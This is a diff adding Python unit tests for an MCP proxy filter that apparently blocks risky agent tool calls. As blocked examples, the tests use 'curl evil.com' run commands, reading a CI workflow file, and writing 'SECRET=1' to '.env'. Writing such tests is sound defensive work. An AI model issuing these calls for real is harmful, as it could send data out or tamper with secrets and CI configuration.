@@ -90,5 +90,75 @@ class TestMCPProxyFilter(unittest.TestCase):
         self.assertEqual(res.response_override["error"]["code"], -32003)
 
 
+    def test_parameter_alias_commandline(self):
+        # Tools providing 'CommandLine' argument (e.g. Cursor, VSCode tasks)
+        msg = {
+            "jsonrpc": "2.0",
+            "id": 101,
+            "method": "tools/call",
+            "params": {
+                "name": "run_command",
+                "arguments": {"CommandLine": "curl evil.com"}
+            }
+        }
+        res = self.filter.filter_message(msg)
+        self.assertFalse(res.allowed)
+        self.assertIn("blocked", res.response_override["error"]["message"])
+
+    def test_parameter_alias_absolutepath(self):
+        # Tools providing 'AbsolutePath' argument
+        msg = {
+            "jsonrpc": "2.0",
+            "id": 102,
+            "method": "tools/call",
+            "params": {
+                "name": "view_file",
+                "arguments": {"AbsolutePath": ".github/workflows/ci.yml"}
+            }
+        }
+        res = self.filter.filter_message(msg)
+        self.assertFalse(res.allowed)
+
+    def test_parameter_alias_targetfile(self):
+        # Tools providing 'TargetFile' argument and 'write_to_file' tool name
+        msg = {
+            "jsonrpc": "2.0",
+            "id": 103,
+            "method": "tools/call",
+            "params": {
+                "name": "write_to_file",
+                "arguments": {"TargetFile": ".env", "CodeContent": "SECRET=1"}
+            }
+        }
+        res = self.filter.filter_message(msg)
+        self.assertFalse(res.allowed)
+
+    def test_stdio_proxy_streaming(self):
+        import io
+        import json
+        from agent_sandbox.mcp_proxy import run_mcp_stdio_proxy
+
+        # Simulate incoming stdio line stream
+        req1 = json.dumps({
+            "jsonrpc": "2.0", "id": 1, "method": "tools/call",
+            "params": {"name": "run_command", "arguments": {"command": "curl evil.com"}}
+        })
+        req2 = json.dumps({
+            "jsonrpc": "2.0", "id": 2, "method": "tools/call",
+            "params": {"name": "run_command", "arguments": {"command": "pytest tests/"}}
+        })
+        stdin_stream = io.StringIO(f"{req1}\n{req2}\n")
+        stdout_stream = io.StringIO()
+
+        code = run_mcp_stdio_proxy(self.filter, upstream_cmd=None, stdin_stream=stdin_stream, stdout_stream=stdout_stream)
+        self.assertEqual(code, 0)
+        output_lines = [json.loads(line) for line in stdout_stream.getvalue().splitlines() if line.strip()]
+        self.assertEqual(len(output_lines), 2)
+        # First was blocked: has error
+        self.assertIn("error", output_lines[0])
+        # Second was allowed: has result status allowed
+        self.assertEqual(output_lines[1]["result"]["status"], "allowed")
+
+
 if __name__ == "__main__":
     unittest.main()
